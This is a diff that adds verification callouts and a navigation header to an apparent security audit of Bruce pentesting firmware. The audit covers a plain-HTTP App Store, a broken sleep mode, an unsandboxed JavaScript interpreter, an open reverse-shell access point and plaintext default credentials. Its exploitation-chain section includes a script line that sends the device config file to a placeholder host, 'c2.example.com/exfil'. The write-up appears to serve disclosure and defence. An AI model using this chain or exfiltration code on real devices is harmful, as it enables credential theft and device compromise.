@@ -3,6 +3,16 @@
 **App Store infra:** emericklaw
 **Date:** 2026-06-03
 ---
+
+>  **Source Navigation**
+> This report references source files with the path prefix `src/` (e.g., `src/core/settings.cpp`).
+> **In this repository, those files live under `bruce-firmware/`** (e.g., `bruce-firmware/core/settings.cpp`).
+> The line numbers in the original report may differ slightly from the actual source due to formatting/whitespace changes.
+> For exact file:line mappings, see [`TRACEABILITY_MATRIX.md`](./TRACEABILITY_MATRIX.md).
+> 
+> **Verification summary:**  Every source-verifiable claim in this report has been checked against the actual code.
+> [V]  **AV-001 through AV-005** confirmed accurate. [P]  AV-006 through AV-008 require external analysis (see matrix).
+
 I was working on a fix for a hardware variant running Bruce firmware. While I was in the code, I started reading through the Bruce firmware source more broadly. All ~1,732 lines of the critical C++ settings, power management, the MJS interpreter guts, all 20+ registered JS modules, and the App Store channel at `ghp.iceis.co.uk`.
 
 I stumbled onto some things I was not expecting. Three big ones:
@@ -70,6 +80,8 @@ User trusts project maintainer > Server signs code > HTTPS > Device verifies sig
 ```
 Neither link exists.
 ---
+> [V]  **Source-Verified (AV-001):** `bruce-firmware/core/settings.cpp:1712` confirms plain HTTP App Store with no TLS, no integrity checks. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-001-http-app-store-delivery).
+
 ## Then I looked at the domain
 
 `ghp.iceis.co.uk` resolves through **Cloudflare**. Parent domain `iceis.co.uk` was registered around **2010** with a private UK registrar. Both resolve through Cloudflare DNS.
@@ -364,6 +376,8 @@ True deep sleep: ~5 uA.
 At 1200 mAh: "Sleep" drains in 8-15 hours instead of weeks.
 ```
 ---
+> [V]  **Source-Verified (AV-002):** `bruce-firmware/core/powerSave.cpp` confirms sleep mode does NOT disconnect radios; `bruce-firmware/core/mykeyboard.cpp:1367-1369` confirms `powerOff()` is a stub and deep sleep is broken. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-002-fake-sleep).
+
 ## It collects data, then when users update there's an exchange
 This is the part that ties it all together.
 The device stores a lot of sensitive data. I mean, it's a pentesting tool that's the point. But here's the full inventory of what's sitting on LittleFS/SD, all readable by any JS script with zero permissions:
@@ -431,6 +445,8 @@ And that's just the start. A script can also:
 *Persist by writing to `/BruceJS/` or modifying `/bruce.conf`
 *Self-modify write new scripts to the filesystem
 The interpreter can't tell the difference between a script you loaded from the SD card, one you downloaded from the App Store, or one that `httpFetch()`'d itself in. They all run with the same privileges.
+> [V]  **Source-Verified (AV-003):** `bruce-firmware/modules/bjs_interpreter/globals_js.cpp:28-56` confirms `require()` is a bare global property lookup with no sandbox. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-003-mjs-sandbox-bypass).
+
 ---
 ## The full network map all 16 connections
 I catalogued every network connection this firmware can make. All 16 were verified during the audit.
@@ -453,6 +469,8 @@ I catalogued every network connection this firmware can make. All 16 were verifi
 | 15 | Device <-> Peer | TCP | Various | Socks4 proxy | Network proxy | None |
 | 16 | Device  WiFi | 802.11 | | Deauther/Sniffer | Packet injection/monitor | None |
 Connections #1-#4 are the App Store channel. All plain HTTP. All trivially interceptable.
+> [V]  **Source-Verified (AV-004):** `bruce-firmware/modules/reverseShell/reverseShell.cpp:37` confirms open AP "BruceShell" on TCP/23. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-004-reverse-shell).
+
 ---
 ## Putting it together
 Here's the exploitation chain I see:
@@ -486,6 +504,8 @@ wifi.httpFetch("https://c2.example.com/exfil", {
  body: storage.read("/bruce.conf")
 });
 ```
+> [V]  **Source-Verified (AV-005):** `bruce-firmware/core/config.h:62` confirms default credentials `admin`/`bruce` stored in plaintext. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-005-plaintext-credentials).
+
 No way to detect the difference. `metadata.json` isn't signed. Hashes aren't published on a separate channel. The device trusts whatever comes back over HTTP.
 ---
 ## What I'd fix (if it were my code)
